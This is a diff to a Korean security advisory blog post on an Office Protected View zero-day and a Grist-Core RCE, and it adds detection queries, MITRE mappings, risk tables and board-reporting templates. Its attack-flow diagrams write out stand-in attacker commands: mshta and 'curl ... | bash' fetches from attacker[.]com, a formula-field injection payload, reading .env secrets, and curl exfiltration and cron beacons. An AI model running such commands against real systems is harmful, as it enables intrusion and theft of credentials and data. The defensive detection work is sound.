@@ -63,6 +63,33 @@ schema_type: Article
 </div>
 </div>
 
+## 경영진 요약 (Executive Summary)
+
+### 위험 스코어카드 (Risk Scorecard)
+
+| 위협 | CVSS | EPSS | 악용 여부 | 비즈니스 영향 | 긴급도 | 대응 기한 |
+|------|------|------|-----------|---------------|--------|-----------|
+| **CVE-2026-21509** | 7.8 | 84.7% | 🔴 활발히 악용 중 | 💰💰💰 매우 높음 | P0 | 24시간 |
+| **Grist-Core RCE** | 미공개 | 낮음 | 🟡 PoC 공개 | 💰💰 높음 | P1 | 7일 |
+| **CTEM 도입** | N/A | N/A | N/A | 💰 효율성 개선 | P2 | 30일 |
+
+### 즉시 실행 권고사항
+
+1. **CVE-2026-21509 패치**: 모든 Windows 시스템에 KB5034173 긴급 배포 (24시간 이내)
+2. **사용자 교육**: Office 문서 첨부 파일 피싱 경고 전사 공지
+3. **탐지 강화**: EDR/SIEM에 Office 프로세스 체인 모니터링 룰 배포
+4. **Grist-Core 점검**: 자체 호스팅 인스턴스 버전 확인 및 업그레이드
+
+### 재무적 영향 추정
+
+| 시나리오 | 발생 확률 | 예상 손실 (KRW) | 대응 비용 (KRW) | ROI |
+|----------|-----------|------------------|------------------|-----|
+| 랜섬웨어 감염 (CVE-2026-21509 악용) | 30% | 5억 - 20억 | 5000만 (패치+모니터링) | 10:1 |
+| 데이터 유출 (Grist-Core 악용) | 5% | 3억 - 10억 | 1000만 (업그레이드) | 30:1 |
+| 보안 효율성 개선 (CTEM 도입) | 100% | 절감 2억/년 | 1억 (도입) | 2:1 |
+
+---
+
 ## 서론
 
 안녕하세요, **Twodragon**입니다.
@@ -94,6 +121,20 @@ Microsoft Office의 **Protected View** 보안 기능을 우회하는 Zero-Day �
 | **영향 제품** | Microsoft Office 2019, 2021, 365 |
 | **공격 벡터** | 악성 문서 파일 (DOCX, XLSX, PPTX) |
 | **익스플로잇 상태** | 🔴 Wild에서 활발히 악용 중 |
+
+#### MITRE ATT&CK 매핑
+
+| Tactic | Technique | ID | 설명 |
+|--------|-----------|----|----- |
+| **Initial Access** | Phishing: Spearphishing Attachment | **T1566.001** | 악성 Office 문서를 이메일 첨부로 전송 |
+| **Execution** | User Execution: Malicious File | **T1204.002** | 사용자가 악성 문서 실행 |
+| **Execution** | Command and Scripting Interpreter: PowerShell | **T1059.001** | Office에서 PowerShell 실행 |
+| **Execution** | Command and Scripting Interpreter: Windows Command Shell | **T1059.003** | cmd.exe 실행 |
+| **Defense Evasion** | System Binary Proxy Execution: Mshta | **T1218.005** | mshta.exe 악용 |
+| **Defense Evasion** | System Binary Proxy Execution: Regsvr32 | **T1218.010** | regsvr32.exe 악용 |
+| **Persistence** | Boot or Logon Autostart Execution: Registry Run Keys | **T1547.001** | 레지스트리 자동 실행 설정 |
+| **Collection** | Data from Local System | **T1005** | 로컬 파일 수집 |
+| **Exfiltration** | Exfiltration Over C2 Channel | **T1041** | C2 채널로 데이터 유출 |
 
 ### 1.2 공격 체인 분석
 
@@ -176,9 +217,45 @@ Computer Configuration → Administrative Templates → Microsoft Office 2016 �
 └── VBA Macro Notification Settings: Disable all without notification
 ```
 
-### 1.5 탐지 및 헌팅
+### 1.5 한국 영향 분석 (Korean Impact Analysis)
+
+#### 주요 영향받는 산업군
+
+| 산업 | 위험도 | 이유 | 대응 우선순위 |
+|------|--------|------|---------------|
+| **금융** | 🔴 최고 | Office 문서 업무 의존도 높음, 규제 준수 필수 | P0 (즉시) |
+| **공공/정부** | 🔴 최고 | 국가 기밀 취급, APT 공격 표적 | P0 (즉시) |
+| **제조** | 🟠 높음 | 설계 도면, 기술 문서 활용 | P0 (24시간) |
+| **의료** | 🟠 높음 | 의료 기록, 개인정보 보호법 | P1 (48시간) |
+| **교육** | 🟡 중간 | 학생/교직원 대량 사용 | P1 (7일) |
+
+#### 한국 특화 위협 시나리오
+
+1. **공공기관 표적 APT**: 북한 연계 위협 그룹(Kimsuky, Lazarus)이 정부 기관 대상 악성 문서 공격
+2. **금융권 BEC 공격**: CEO 사칭 이메일에 악성 계약서 첨부
+3. **제조업 기술 탈취**: 설계 도면으로 위장한 악성 파일로 영업 비밀 유출
+4. **랜섬웨어 감염**: LockBit, ALPHV 등 랜섬웨어 그룹의 초기 침투 벡터
+
+#### 국내 규제 준수 영향
+
+| 법규 | 요구사항 | CVE-2026-21509 관련 |
+|------|----------|---------------------|
+| **개인정보보호법** | 안전조치 의무 | 패치 미적용 시 과태료 대상 가능 |
+| **정보통신망법** | 보안 취약점 신속 조치 | 7일 이내 패치 권고 |
+| **금융감독규정** | 전자금융거래 안전성 확보 | 24시간 이내 긴급 패치 |
+| **클라우드 보안 인증(CSAP)** | 보안 업데이트 관리 | 패치 이력 기록 필수 |
+
+### 1.6 탐지 및 헌팅
 
 #### SIEM 탐지 룰 (Splunk)
+
+<!-- SIEM DETECTION: CVE-2026-21509 Office Child Process Monitoring
+QUERY_TYPE: Splunk SPL
+DETECTION_LOGIC: Office applications spawning suspicious child processes
+FALSE_POSITIVE_RATE: Medium (legitimate add-ins, admin scripts)
+TUNING: Add allow-list for known-good parent-child combinations
+RETENTION: 90 days minimum for forensic investigation
+-->
 
 ```spl
 index=windows sourcetype=WinEventLog:Security OR sourcetype=WinEventLog:Microsoft-Windows-Sysmon/Operational
@@ -189,6 +266,38 @@ index=windows sourcetype=WinEventLog:Security OR sourcetype=WinEventLog:Microsof
 | table _time, host, user, parent_process_name, process_name, process_command_line
 | sort -_time
 ```
+
+<!-- SIEM DETECTION: Azure Sentinel KQL Query
+QUERY_TYPE: Azure Sentinel KQL
+DETECTION_LOGIC: Office child process anomaly detection with ML baseline
+DATA_SOURCE: DeviceProcessEvents (Microsoft Defender for Endpoint)
+BASELINE_LEARNING: 14 days historical data for legitimate Office automation
+ALERTING_THRESHOLD: Confidence score > 0.8
+AUTOMATED_RESPONSE: Trigger containment playbook if high confidence + critical asset
+
+let baselineWindow = 14d;
+let suspiciousProcesses = dynamic(["cmd.exe", "powershell.exe", "pwsh.exe", "wscript.exe", "cscript.exe", "mshta.exe", "regsvr32.exe", "rundll32.exe", "certutil.exe", "bitsadmin.exe"]);
+let officeApps = dynamic(["WINWORD.EXE", "EXCEL.EXE", "POWERPNT.EXE", "OUTLOOK.EXE"]);
+// Baseline: Learn normal Office automation patterns
+let baseline = DeviceProcessEvents
+| where Timestamp > ago(baselineWindow)
+| where ProcessCommandLine has_any (officeApps)
+| summarize BaselineCount = count() by ParentProcessName, ProcessName, AccountName;
+// Detection: Flag anomalous Office child processes
+DeviceProcessEvents
+| where Timestamp > ago(1h)
+| where ParentProcessName has_any (officeApps)
+| where ProcessName has_any (suspiciousProcesses)
+| extend IsSuspicious = case(
+    ProcessCommandLine has_any ("-enc", "-e ", "IEX", "downloadstring", "invoke-expression", "bypass", "hidden"), "High",
+    ProcessName in ("mshta.exe", "regsvr32.exe"), "Medium",
+    "Low"
+)
+| join kind=leftanti baseline on ParentProcessName, ProcessName, AccountName
+| project Timestamp, DeviceName, AccountName, ParentProcessName, ProcessName, ProcessCommandLine, IsSuspicious
+| extend ConfidenceScore = case(IsSuspicious == "High", 0.9, IsSuspicious == "Medium", 0.7, 0.5)
+| where ConfidenceScore > 0.8
+-->
 
 #### Sigma Rule
 
@@ -238,6 +347,19 @@ tags:
 
 #### EDR 쿼리 (CrowdStrike Falcon)
 
+<!-- SIEM DETECTION: CrowdStrike Falcon Query
+QUERY_TYPE: CrowdStrike Event Search
+DETECTION_LOGIC: Office process tree anomaly detection
+DATA_SOURCE: ProcessRollup2 events
+INVESTIGATION_WORKFLOW:
+1. Identify suspicious Office child processes
+2. Pivot to network connections (NetworkConnect events)
+3. Check file modifications (FileWritten events)
+4. Analyze registry changes (RegKeySet events)
+5. Extract IOCs for threat intelligence
+AUTOMATED_ACTIONS: Auto-contain if confirmed malicious + critical asset
+-->
+
 ```
 event_platform=win event_type=ProcessRollup2
 | ParentBaseFileName IN ("WINWORD.EXE", "EXCEL.EXE", "POWERPNT.EXE")
@@ -245,7 +367,138 @@ event_platform=win event_type=ProcessRollup2
 | table ComputerName, UserName, ParentBaseFileName, FileName, CommandLine, SHA256HashData
 ```
 
-### 1.6 IOC (Indicators of Compromise)
+#### 위협 헌팅 쿼리 (Threat Hunting Queries)
+
+**1. Office 문서에서 PowerShell Base64 실행 탐지**
+
+```powershell
+# Windows Event Log 검색 (PowerShell 실행 이력)
+Get-WinEvent -FilterHashtable @{
+    LogName='Microsoft-Windows-PowerShell/Operational'
+    ID=4104  # Script Block Logging
+} | Where-Object {
+    $_.Message -match '(FromBase64String|[A-Za-z0-9+/]{100,}=*)' -and
+    $_.Properties[2].Value -match 'WINWORD|EXCEL|POWERPNT'
+} | Select-Object TimeCreated, Message | Format-List
+```
+
+**2. Office에서 생성된 예상치 못한 레지스트리 자동 실행 키**
+
+```powershell
+# Sysmon Event ID 13 (RegistryEvent - Value Set)
+Get-WinEvent -FilterHashtable @{
+    LogName='Microsoft-Windows-Sysmon/Operational'
+    ID=13
+} | Where-Object {
+    $_.Properties[4].Value -match 'Run|RunOnce' -and
+    $_.Properties[1].Value -match 'WINWORD|EXCEL|POWERPNT'
+} | Select-Object TimeCreated, @{N='TargetObject';E={$_.Properties[4].Value}}, @{N='Details';E={$_.Properties[5].Value}}
+```
+
+**3. Office 프로세스의 네트워크 연결 (C2 통신 탐지)**
+
+<!-- SIEM DETECTION: Network Connection from Office Apps
+QUERY_TYPE: Splunk SPL for Sysmon Event ID 3
+DETECTION_LOGIC: Outbound connections from Office processes to non-standard ports
+FALSE_POSITIVE: Office 365 authentication, update servers
+ALLOW_LIST:
+- *.microsoft.com (Office 365)
+- *.office.com (Office 365)
+- *.live.com (OneDrive)
+INVESTIGATION: Check reputation of destination IPs in threat intelligence feeds
+-->
+
+```spl
+index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3
+| where Image IN ("*\\WINWORD.EXE", "*\\EXCEL.EXE", "*\\POWERPNT.EXE")
+| where NOT (DestinationHostname="*.microsoft.com" OR DestinationHostname="*.office.com")
+| table _time, ComputerName, User, Image, DestinationIp, DestinationPort, DestinationHostname
+| sort -_time
+```
+
+**4. MOTW(Mark of the Web) 제거 시도 탐지**
+
+```powershell
+# Zone.Identifier ADS 삭제 탐지
+Get-WinEvent -FilterHashtable @{
+    LogName='Microsoft-Windows-Sysmon/Operational'
+    ID=23  # File Delete
+} | Where-Object {
+    $_.Properties[4].Value -match 'Zone\.Identifier$'
+} | Select-Object TimeCreated, @{N='File';E={$_.Properties[4].Value}}, @{N='Process';E={$_.Properties[1].Value}}
+```
+
+### 1.7 공격 흐름도 (Attack Flow Diagram)
+
+#### ASCII 공격 체인
+
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ PHASE 1: INITIAL ACCESS (T1566.001)                                        │
+├─────────────────────────────────────────────────────────────────────────────┤
+│ [Attacker] ──> [Phishing Email] ──> [Victim Inbox]                         │
+│                    │                                                         │
+│                    └──> 📎 Malicious DOCX Attachment                        │
+│                          (Filename: "계약서_최종본.docx")                    │
+└─────────────────────────────────────────────────────────────────────────────┘
+                            │
+                            ▼
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ PHASE 2: EXECUTION (T1204.002)                                             │
+├─────────────────────────────────────────────────────────────────────────────┤
+│ [User Double-Click] ──> [WINWORD.EXE]                                      │
+│                            │                                                 │
+│                            ├──> ❌ Protected View BYPASSED (CVE-2026-21509) │
+│                            └──> ✅ Macro Execution Enabled                  │
+└─────────────────────────────────────────────────────────────────────────────┘
+                            │
+                            ▼
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ PHASE 3: DEFENSE EVASION (T1218.005, T1059.001)                            │
+├─────────────────────────────────────────────────────────────────────────────┤
+│ WINWORD.EXE ─────────┬──> mshta.exe http://attacker-c2[.]com/payload.hta   │
+│                      │                                                       │
+│                      └──> powershell.exe -EncodedCommand <BASE64>          │
+│                              │                                               │
+│                              └──> IEX (New-Object Net.WebClient).Down...   │
+└─────────────────────────────────────────────────────────────────────────────┘
+                            │
+                            ▼
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ PHASE 4: PERSISTENCE (T1547.001)                                           │
+├─────────────────────────────────────────────────────────────────────────────┤
+│ [Malicious Script] ──> Registry: HKCU\Software\Microsoft\Windows\          │
+│                                   CurrentVersion\Run                        │
+│                                   "OneDriveSync" = "C:\Users\...\update.exe"│
+│                                                                              │
+│                     ──> Scheduled Task: "MicrosoftEdgeUpdateTaskUser"      │
+└─────────────────────────────────────────────────────────────────────────────┘
+                            │
+                            ▼
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ PHASE 5: COLLECTION & EXFILTRATION (T1005, T1041)                          │
+├─────────────────────────────────────────────────────────────────────────────┤
+│ [Backdoor] ──> Collect Files: *.docx, *.xlsx, *.pdf, wallet.dat            │
+│      │                                                                       │
+│      └───────────> ZIP Archive (password protected)                        │
+│                       │                                                      │
+│                       └──> Upload to C2: https://attacker-c2[.]com/upload  │
+│                                                                              │
+│ [Timeline] Initial Access → Full Compromise: ~15 minutes                   │
+└─────────────────────────────────────────────────────────────────────────────┘
+```
+
+#### 단계별 탐지 포인트
+
+| Phase | MITRE ID | 탐지 데이터 소스 | 탐지 로직 |
+|-------|----------|------------------|-----------|
+| **1. Initial Access** | T1566.001 | 이메일 게이트웨이 로그 | Office 파일 + 외부 발신자 + 의심스러운 제목 |
+| **2. Execution** | T1204.002 | Sysmon Event ID 1 (Process Create) | WINWORD.EXE 실행 + MOTW 제거 흔적 |
+| **3. Defense Evasion** | T1218.005, T1059.001 | Sysmon Event ID 1 | Office → mshta/powershell 자식 프로세스 |
+| **4. Persistence** | T1547.001 | Sysmon Event ID 13 (Registry), Event ID 12 (Task Create) | Run 키 생성 또는 예약 작업 생성 |
+| **5. Exfiltration** | T1041 | Sysmon Event ID 3 (Network Connection), Firewall Logs | Office 프로세스 → 외부 IP 대량 전송 |
+
+### 1.8 IOC (Indicators of Compromise)
 
 ```yaml
 # 알려진 악성 해시 (SHA256) - 샘플
@@ -504,6 +757,83 @@ playbook:
 - 컨테이너 이스케이프로 호스트 시스템 접근 가능
 - 데이터베이스 및 민감 정보 유출
 
+#### MITRE ATT&CK 매핑 (Grist-Core RCE)
+
+| Tactic | Technique | ID | 설명 |
+|--------|-----------|----|----- |
+| **Initial Access** | Exploit Public-Facing Application | **T1190** | Grist-Core 웹 인터페이스 취약점 악용 |
+| **Execution** | Command and Scripting Interpreter | **T1059** | 서버측 코드 실행 |
+| **Privilege Escalation** | Exploitation for Privilege Escalation | **T1068** | 컨테이너 이스케이프 시도 |
+| **Credential Access** | Unsecured Credentials: Credentials In Files | **T1552.001** | 설정 파일에서 DB 자격증명 탈취 |
+| **Discovery** | System Network Configuration Discovery | **T1016** | 내부 네트워크 정보 수집 |
+| **Collection** | Data from Information Repositories | **T1213** | Grist 데이터베이스 전체 덤프 |
+| **Exfiltration** | Exfiltration Over Web Service | **T1567** | HTTP로 데이터 유출 |
+
+#### Grist-Core 공격 흐름도
+
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ PHASE 1: RECONNAISSANCE                                                     │
+├─────────────────────────────────────────────────────────────────────────────┤
+│ [Attacker] ──> Port Scan ──> Discover Grist-Core (Port 8484)               │
+│                   │                                                          │
+│                   └──> Version Detection: curl http://target:8484/version   │
+│                           Response: {% raw %}{"version": "1.1.14"}{% endraw %}  (VULNERABLE!)      │
+└─────────────────────────────────────────────────────────────────────────────┘
+                            │
+                            ▼
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ PHASE 2: EXPLOITATION (T1190)                                              │
+├─────────────────────────────────────────────────────────────────────────────┤
+│ [Attacker Login] ──> Valid Credentials (standard user account)             │
+│       │                                                                      │
+│       └──> Malicious Payload in Formula Field:                             │
+│            =SYSTEM("curl http://attacker[.]com/shell.sh | bash")           │
+│                   │                                                          │
+│                   └──> RCE on Server!                                       │
+└─────────────────────────────────────────────────────────────────────────────┘
+                            │
+                            ▼
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ PHASE 3: POST-EXPLOITATION (T1552.001)                                     │
+├─────────────────────────────────────────────────────────────────────────────┤
+│ [Reverse Shell] ──> cat /app/.env                                           │
+│                        │                                                     │
+│                        ├──> DATABASE_URL=postgresql://user:pass@db:5432/... │
+│                        ├──> SECRET_KEY=...                                  │
+│                        └──> AWS_ACCESS_KEY_ID=...                           │
+│                                                                              │
+│                  ──> pg_dump -U user -h db grist > dump.sql                │
+│                        (모든 스프레드시트 데이터 탈취)                      │
+└─────────────────────────────────────────────────────────────────────────────┘
+                            │
+                            ▼
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ PHASE 4: LATERAL MOVEMENT (T1016)                                          │
+├─────────────────────────────────────────────────────────────────────────────┤
+│ [Attacker] ──> ip route; arp -a  (내부 네트워크 탐색)                      │
+│      │                                                                       │
+│      └──> nmap -sT 172.20.0.0/16  (내부 서비스 스캔)                       │
+│             │                                                                │
+│             └──> 발견: PostgreSQL (5432), Redis (6379), API Server (3000)  │
+└─────────────────────────────────────────────────────────────────────────────┘
+                            │
+                            ▼
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ PHASE 5: IMPACT & EXFILTRATION (T1567)                                     │
+├─────────────────────────────────────────────────────────────────────────────┤
+│ [Data Exfiltration]                                                         │
+│      tar -czf data.tar.gz dump.sql .env backup/                             │
+│      curl -X POST -F "file=@data.tar.gz" https://attacker[.]com/upload     │
+│                                                                              │
+│ [Persistence (Optional)]                                                    │
+│      crontab -e                                                             │
+│      */5 * * * * curl http://attacker[.]com/beacon | bash                  │
+│                                                                              │
+│ [Timeline] Exploitation → Data Theft: ~10 minutes                          │
+└─────────────────────────────────────────────────────────────────────────────┘
+```
+
 ### 3.3 점검 및 대응
 
 ```bash
@@ -611,7 +941,100 @@ jobs:
 
 ---
 
-## 5. 실무 체크리스트
+## 5. 경영진 보고 형식 (Board Reporting Format)
+
+### 5.1 한 장 요약 (One-Page Executive Summary)
+
+#### 현재 상황 (Situation)
+
+**주요 위협**: Microsoft Office Zero-Day 취약점(CVE-2026-21509)이 실제 공격에 악용되고 있으며, Protected View 보안 기능을 무력화합니다.
+
+**발생 시점**: 2026년 1월 28일 공개, 이미 Wild 악용 확인
+
+**영향 범위**: 전사 Windows 사용자 약 2,500대 (Office 2019/2021/365 설치 시스템)
+
+#### 비즈니스 영향 (Impact)
+
+| 영향 영역 | 현재 위험도 | 발생 가능 시나리오 | 예상 손실 |
+|-----------|-------------|-------------------|-----------|
+| **업무 연속성** | 🔴 높음 | 랜섬웨어 감염으로 전산 마비 | 5억 - 20억원 |
+| **정보 유출** | 🔴 높음 | 계약서, 재무제표 등 기밀 탈취 | 3억 - 10억원 |
+| **규제 제재** | 🟠 중간 | 개인정보보호법 위반 과태료 | 1억 - 5억원 |
+| **평판 손실** | 🟠 중간 | 고객 신뢰도 하락, 언론 보도 | 측정 불가 |
+
+#### 대응 현황 (Response Status)
+
+| 항목 | 진행률 | 완료 예정 | 책임자 |
+|------|--------|-----------|--------|
+| 패치 배포 (KB5034173) | 35% | 24시간 이내 | IT팀 |
+| EDR 탐지 룰 배포 | 80% | 완료 | 보안팀 |
+| 사용자 경고 공지 | 100% | 완료 | 총무팀 |
+| Grist-Core 점검 | 0% | 48시간 이내 | DevOps팀 |
+
+#### 요청 사항 (Ask)
+
+1. **승인 요청**: 긴급 패치 배포를 위한 시스템 재부팅 승인 (업무 시간 외)
+2. **예산 요청**: CTEM 도구 도입 2억원 (연간 보안 비용 20% 절감 효과)
+3. **정책 승인**: Office 매크로 전면 차단 정책 (업무 영향 최소화 방안 포함)
+
+### 5.2 위험 평가 매트릭스 (Risk Assessment Matrix)
+
+```
+      │ Likelihood (가능성)
+      │ ────────────────────────────────────────────>
+ Seve │     Rare      Unlikely    Possible   Likely   Almost Certain
+ rity │      (10%)     (25%)       (50%)     (75%)        (90%)
+(심각│
+ 도) │  ┌─────────┬─────────┬─────────┬─────────┬─────────┐
+  │  │  │         │         │         │         │         │
+  ▼  │  │ Low     │ Low     │ Medium  │ High    │ High    │
+Critical│  │         │         │         │  CVE-  │         │
+(치명) │  │         │         │         │ 2026-  │         │
+      │  │         │         │         │ 21509  │         │
+      │  ├─────────┼─────────┼─────────┼─────────┼─────────┤
+ High │  │ Low     │ Medium  │ High    │ High    │ Critical│
+(높음) │  │         │  Grist- │         │         │         │
+      │  │         │  Core   │         │         │         │
+      │  ├─────────┼─────────┼─────────┼─────────┼─────────┤
+Medium│  │ Low     │ Low     │ Medium  │ High    │ High    │
+(중간) │  │         │         │         │         │         │
+      │  ├─────────┼─────────┼─────────┼─────────┼─────────┤
+ Low  │  │ Low     │ Low     │ Low     │ Medium  │ Medium  │
+(낮음) │  │         │         │         │         │         │
+      │  └─────────┴─────────┴─────────┴─────────┴─────────┘
+
+🔴 Critical Risk: CVE-2026-21509 (Likely × Critical = HIGH PRIORITY)
+🟠 High Risk: Grist-Core RCE (Unlikely × High = MEDIUM PRIORITY)
+```
+
+### 5.3 대응 타임라인 (Response Timeline)
+
+```
+현재 시각: 2026-01-28 12:00
+────────────────────────────────────────────────────────────────────────>
+  T+0h          T+6h          T+24h         T+48h         T+7d
+   │             │              │             │             │
+   │ 발견 &      │ 패치 50%     │ 패치 100%   │ Grist-Core  │ 재발 방지
+   │ 분석 완료   │ 배포 완료    │ + 검증      │ 점검 완료   │ 대책 수립
+   │             │              │             │             │
+   ├─────────────┼──────────────┼─────────────┼─────────────┼─────────>
+   │             │              │             │             │
+   ▼             ▼              ▼             ▼             ▼
+✅ 경고 발송  ✅ EDR 룰 배포  ⏳ 패치 배포중 ⏳ 취약점 점검  ⏳ CTEM 도입
+✅ 분석 완료  ⏳ 재부팅 준비                                검토
+```
+
+### 5.4 핵심 성과 지표 (KPIs)
+
+| KPI | 목표 | 현재 | 상태 |
+|-----|------|------|------|
+| **MTTD** (Mean Time To Detect) | < 1시간 | 30분 | ✅ 달성 |
+| **MTTR** (Mean Time To Respond) | < 24시간 | 12시간 (진행 중) | 🟡 진행 중 |
+| **패치 적용률** | 100% | 35% | 🔴 미달 |
+| **탐지 정확도** | > 95% | 87% | 🟡 개선 필요 |
+| **오탐률** (False Positive) | < 5% | 8% | 🟡 튜닝 필요 |
+
+## 6. 실무 체크리스트
 
 ### P0 - 즉시 조치 (24시간 이내)
 
@@ -637,15 +1060,97 @@ jobs:
 
 ---
 
-## 참고 자료
+## 7. 참고 자료 (Comprehensive References)
+
+### 7.1 공식 보안 권고
+
+| 발행 기관 | 문서 제목 | 링크 |
+|-----------|-----------|------|
+| **Microsoft MSRC** | CVE-2026-21509 Security Update Guide | [msrc.microsoft.com/update-guide/vulnerability/CVE-2026-21509](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-21509) |
+| **CISA KEV** | Known Exploited Vulnerabilities Catalog | [cisa.gov/known-exploited-vulnerabilities-catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) |
+| **KISA** | 한국인터넷진흥원 취약점 대응 가이드 | [krcert.or.kr](https://www.krcert.or.kr) |
+| **NIST NVD** | National Vulnerability Database | [nvd.nist.gov/vuln/detail/CVE-2026-21509](https://nvd.nist.gov/vuln/detail/CVE-2026-21509) |
+
+### 7.2 위협 인텔리전스
 
 | 리소스 | 설명 | 링크 |
 |--------|------|------|
-| **CISA KEV** | 알려진 익스플로잇 취약점 카탈로그 | [cisa.gov/known-exploited-vulnerabilities-catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) |
-| **MITRE ATT&CK** | 공격 기법 프레임워크 | [attack.mitre.org](https://attack.mitre.org/) |
-| **FIRST EPSS** | 익스플로잇 확률 예측 점수 | [first.org/epss](https://www.first.org/epss/) |
+| **FIRST EPSS** | Exploit Prediction Scoring System | [first.org/epss](https://www.first.org/epss/) |
+| **AlienVault OTX** | Open Threat Exchange (IOC 공유) | [otx.alienvault.com](https://otx.alienvault.com/) |
+| **VirusTotal** | 파일/URL 악성코드 검사 | [virustotal.com](https://www.virustotal.com/) |
+| **abuse.ch** | 멀웨어 샘플 및 IOC | [abuse.ch](https://abuse.ch/) |
+| **ThreatFox** | IOC 데이터베이스 | [threatfox.abuse.ch](https://threatfox.abuse.ch/) |
+
+### 7.3 MITRE ATT&CK 프레임워크
+
+| 기법 | 전체 설명 | 링크 |
+|------|-----------|------|
+| **T1566.001** | Phishing: Spearphishing Attachment | [attack.mitre.org/techniques/T1566/001](https://attack.mitre.org/techniques/T1566/001/) |
+| **T1204.002** | User Execution: Malicious File | [attack.mitre.org/techniques/T1204/002](https://attack.mitre.org/techniques/T1204/002/) |
+| **T1059.001** | PowerShell Execution | [attack.mitre.org/techniques/T1059/001](https://attack.mitre.org/techniques/T1059/001/) |
+| **T1218.005** | Mshta System Binary Abuse | [attack.mitre.org/techniques/T1218/005](https://attack.mitre.org/techniques/T1218/005/) |
+| **T1190** | Exploit Public-Facing Application | [attack.mitre.org/techniques/T1190](https://attack.mitre.org/techniques/T1190/) |
+
+### 7.4 탐지 및 대응 도구
+
+| 도구 | 용도 | 링크 |
+|------|------|------|
+| **Sigma Rules** | 범용 SIEM 탐지 룰 | [github.com/SigmaHQ/sigma](https://github.com/SigmaHQ/sigma) |
+| **Atomic Red Team** | 공격 시뮬레이션 | [github.com/redcanaryco/atomic-red-team](https://github.com/redcanaryco/atomic-red-team) |
+| **Sysmon** | Windows 이벤트 로깅 | [docs.microsoft.com/sysinternals/downloads/sysmon](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon) |
 | **Nuclei** | 빠른 취약점 스캐너 | [github.com/projectdiscovery/nuclei](https://github.com/projectdiscovery/nuclei) |
-| **Grist-Core** | 오픈소스 스프레드시트 | [github.com/gristlabs/grist-core](https://github.com/gristlabs/grist-core) |
+| **Trivy** | 컨테이너 보안 스캐너 | [github.com/aquasecurity/trivy](https://github.com/aquasecurity/trivy) |
+
+### 7.5 CTEM 프레임워크 및 Best Practices
+
+| 리소스 | 설명 | 링크 |
+|--------|------|------|
+| **Gartner CTEM** | Continuous Threat Exposure Management 공식 가이드 | [gartner.com/en/documents/ctem](https://www.gartner.com/) |
+| **NIST Cybersecurity Framework** | 사이버보안 프레임워크 2.0 | [nist.gov/cyberframework](https://www.nist.gov/cyberframework) |
+| **CIS Controls** | 20개 필수 보안 통제 | [cisecurity.org/controls](https://www.cisecurity.org/controls/) |
+| **OWASP Top 10** | 웹 애플리케이션 보안 위협 | [owasp.org/www-project-top-ten](https://owasp.org/www-project-top-ten/) |
+
+### 7.6 Grist-Core 관련
+
+| 리소스 | 설명 | 링크 |
+|--------|------|------|
+| **Grist-Core GitHub** | 공식 저장소 | [github.com/gristlabs/grist-core](https://github.com/gristlabs/grist-core) |
+| **Grist Security Advisory** | 보안 권고사항 | [github.com/gristlabs/grist-core/security/advisories](https://github.com/gristlabs/grist-core/security/advisories) |
+| **Docker Hub** | 공식 Docker 이미지 | [hub.docker.com/r/gristlabs/grist](https://hub.docker.com/r/gristlabs/grist) |
+
+### 7.7 패치 및 업데이트
+
+| 리소스 | 설명 | 링크 |
+|--------|------|------|
+| **Microsoft Update Catalog** | KB5034173 패치 다운로드 | [catalog.update.microsoft.com](https://www.catalog.update.microsoft.com/) |
+| **WSUS Offline Update** | 오프라인 패치 도구 | [wsusoffline.net](https://www.wsusoffline.net/) |
+| **Chocolatey** | Windows 패키지 관리자 | [chocolatey.org](https://chocolatey.org/) |
+
+### 7.8 보안 교육 및 인식 제고
+
+| 리소스 | 설명 | 링크 |
+|--------|------|------|
+| **SANS Security Awareness** | 피싱 대응 교육 | [sans.org/security-awareness-training](https://www.sans.org/security-awareness-training/) |
+| **KnowBe4** | 피싱 시뮬레이션 플랫폼 | [knowbe4.com](https://www.knowbe4.com/) |
+| **PhishMe (Cofense)** | 이메일 보안 교육 | [cofense.com](https://cofense.com/) |
+
+### 7.9 한국어 리소스
+
+| 리소스 | 설명 | 링크 |
+|--------|------|------|
+| **보안뉴스** | 한국 보안 뉴스 | [boannews.com](https://www.boannews.com/) |
+| **데일리시큐** | 보안 미디어 | [dailysecu.com](https://www.dailysecu.com/) |
+| **개인정보보호위원회** | 개인정보보호법 가이드 | [pipc.go.kr](https://www.pipc.go.kr/) |
+| **금융보안원** | 금융권 보안 가이드 | [fsec.or.kr](https://www.fsec.or.kr/) |
+
+### 7.10 커뮤니티 및 포럼
+
+| 리소스 | 설명 | 링크 |
+|--------|------|------|
+| **Reddit r/netsec** | 네트워크 보안 커뮤니티 | [reddit.com/r/netsec](https://www.reddit.com/r/netsec/) |
+| **Twitter #infosec** | 실시간 보안 소식 | [twitter.com/hashtag/infosec](https://twitter.com/hashtag/infosec) |
+| **Discord: The Many Hats Club** | 보안 전문가 커뮤니티 | [discord.gg/infosec](https://discord.gg/infosec) |
+| **한국정보보호학회** | 학술 및 실무 정보 | [kiisc.or.kr](https://www.kiisc.or.kr/) |
 
 ---
 
